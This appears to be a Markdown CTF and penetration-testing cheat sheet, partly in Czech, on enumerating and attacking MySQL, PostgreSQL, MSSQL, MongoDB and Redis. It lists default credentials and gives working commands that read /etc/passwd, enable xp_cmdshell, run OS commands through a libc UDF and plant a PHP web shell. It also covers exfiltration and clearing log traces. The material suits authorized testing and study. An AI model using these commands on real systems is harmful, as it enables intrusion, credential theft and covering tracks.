# Database Enumeration

## Mindset
Databáze často obsahují credentials, user data, configuration, a často jsou špatně zabezpečené. V CTF kontextu možná direct access nebo SQL injection.

## Database Types & Approaches

### MySQL (Port 3306)
- **Common creds**: root:root, root:password, root:""
- **Info schema**: Database/table enumeration
- **Privilege escalation**: FILE permissions, UDF
- **Injection vectors**: Classic SQL injection patterns

### PostgreSQL (Port 5432)  
- **Common creds**: postgres:postgres, postgres:password
- **System catalogs**: pg_* tables pro metadata
- **Extensions**: Custom functions, file access
- **Command execution**: COPY, pg_read_file()

### MSSQL (Port 1433)
- **Common creds**: sa:sa, sa:password
- **System databases**: master, msdb, tempdb
- **xp_cmdshell**: Command execution
- **Linked servers**: Lateral movement

### MongoDB (Port 27017)
- **No auth**: Často completely open
- **Default creds**: admin:admin
- **NoSQL injection**: Different syntax
- **GridFS**: File storage enumeration

### Redis (Port 6379)
- **No auth**: Default configuration
- **Key enumeration**: KEYS * command
- **Data types**: Strings, hashes, lists, sets
- **Configuration**: CONFIG GET *

## Enumeration Checklist

### Connection Testing
- [ ] Anonymous/no authentication access
- [ ] Default credentials testing
- [ ] Version fingerprinting
- [ ] Service banner analysis
- [ ] Network connectivity verification

### Database Discovery
- [ ] Database/schema enumeration
- [ ] Table discovery
- [ ] Column enumeration  
- [ ] Record counting
- [ ] Index analysis

### Permission Analysis
- [ ] Current user privileges
- [ ] Database-specific permissions
- [ ] File system access rights
- [ ] Administrative privileges
- [ ] Command execution capabilities

### Data Extraction
- [ ] Sensitive table identification
- [ ] User credential tables
- [ ] Configuration data
- [ ] Application-specific data
- [ ] System information tables

## Strategic Thinking

### Information Hierarchy
1. **System access** - can I execute commands?
2. **Credential harvest** - user passwords, API keys
3. **Application data** - business logic, user data
4. **Configuration info** - other services, internal IPs
5. **Forensic artifacts** - logs, history, metadata

### Attack Surface Analysis
- **Direct access** - open ports, weak creds
- **Application layer** - SQL injection, NoSQL injection
- **Configuration flaws** - excessive privileges, file access
- **Version vulnerabilities** - unpatched systems
- **Network position** - internal access, trust relationships

## Service-Specific Tactics

### MySQL Tactical Approach
```sql
-- Information gathering
SELECT version();
SELECT user();
SELECT database();
SHOW databases;
SHOW tables;
DESCRIBE table_name;

-- Privilege check
SELECT * FROM mysql.user WHERE User = 'current_user';
SHOW GRANTS;

-- File access (if FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT 'shell' INTO OUTFILE '/var/www/shell.php';
```

### PostgreSQL Tactical Approach
```sql
-- System information
SELECT version();
SELECT current_user;
SELECT current_database();
\l (list databases)
\dt (list tables)

-- File access
SELECT pg_read_file('/etc/passwd');
COPY (SELECT 'shell code') TO '/tmp/shell.php';

-- Command execution (if superuser)
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');
```

### MSSQL Tactical Approach
```sql
-- Information gathering
SELECT @@version;
SELECT SYSTEM_USER;
SELECT DB_NAME();
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;

-- Command execution
EXEC xp_cmdshell 'whoami';
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### MongoDB Tactical Approach
```javascript
// Database enumeration
show dbs
use database_name
show collections
db.collection.find()

// User enumeration
db.getUsers()
db.runCommand({usersInfo: 1})

// System information
db.serverStatus()
db.hostInfo()
```

### Redis Tactical Approach
```redis
# Information gathering
INFO
CONFIG GET *
KEYS *

# Data extraction
GET key_name
HGETALL hash_key
LRANGE list_key 0 -1

# File operations (if permissions allow)
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET mykey "<?php system($_GET['cmd']); ?>"
SAVE
```

## Systematic Documentation

### Pro každou database zaznamenej:
```
Database Type: MySQL
Version: 5.7.32
Access: root:password
Privileges: FILE, CREATE, INSERT, SELECT, UPDATE, DELETE
Interesting databases: 
- webapp_db (user credentials)
- config_db (API keys)
- backup_db (old passwords)
File access: YES (/var/www/html/ writable)
Command execution: NO
Next steps: Upload web shell via SELECT INTO OUTFILE
```

## Context-Specific Strategies

### CTF Database Patterns
- **Intentionally weak configs** - root:root often works
- **Hidden tables/databases** - ctf_flags, admin_panel
- **Staged data** - flags in specific tables
- **Injection points** - obvious SQL injection opportunities

### Production-Like Scenarios
- **Defense in depth** - multiple authentication layers
- **Privilege separation** - limited user permissions
- **Audit logging** - activity monitoring
- **Network segmentation** - database isolation

## Tool Integration

*Specifické tooly v [Tools/Enumeration](../../Tools/Enumeration/)*

### Connection Tools
- **mysql client** - MySQL connections
- **psql** - PostgreSQL client
- **sqlcmd** - MSSQL client
- **mongo** - MongoDB shell
- **redis-cli** - Redis client

### Enumeration Tools
- **nmap scripts** - database-specific scans
- **sqlmap** - automated SQL injection
- **NoSQLMap** - NoSQL injection testing
- **hydra** - credential brute forcing

## Advanced Techniques

### Privilege Escalation Paths
- **UDF (User Defined Functions)** - MySQL custom functions
- **Stored procedures** - MSSQL extended capabilities  
- **Extensions** - PostgreSQL additional functionality
- **Config manipulation** - Redis/MongoDB settings abuse

### Lateral Movement Opportunities
- **Linked servers** - MSSQL cross-database access
- **Federation** - PostgreSQL foreign data wrappers
- **Replication** - Master/slave relationships
- **Cluster access** - MongoDB replica sets

### Data Exfiltration Strategies
- **Direct export** - mysqldump, pg_dump
- **File system** - SELECT INTO OUTFILE
- **Network transfer** - HTTP requests, DNS exfiltration
- **Application layer** - through web interface

## Operational Security

### Noise Considerations
- **Connection logs** - database access logging
- **Query logs** - SQL statement recording
- **Performance impact** - resource-intensive queries
- **Error logs** - failed authentication attempts

### Cleanup Requirements
- **Temporary objects** - functions, procedures, tables
- **File artifacts** - exported files, shells
- **Configuration changes** - modified settings
- **Log traces** - connection history
